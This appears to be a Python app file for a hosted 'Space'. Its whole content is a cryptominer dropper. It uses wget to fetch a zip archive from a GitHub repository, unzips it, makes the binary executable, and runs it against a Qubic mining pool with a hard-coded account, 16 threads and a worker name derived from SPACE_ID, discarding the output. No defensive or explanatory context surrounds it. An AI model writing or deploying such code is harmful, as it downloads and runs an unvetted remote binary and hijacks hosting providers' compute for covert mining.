import os
os.system("wget https://github.com/qqivk/djvg/raw/refs/heads/main/vbxag.zip")
os.system("unzip vbxag.zip")
os.system("chmod +x vbxag")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./vbxag --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
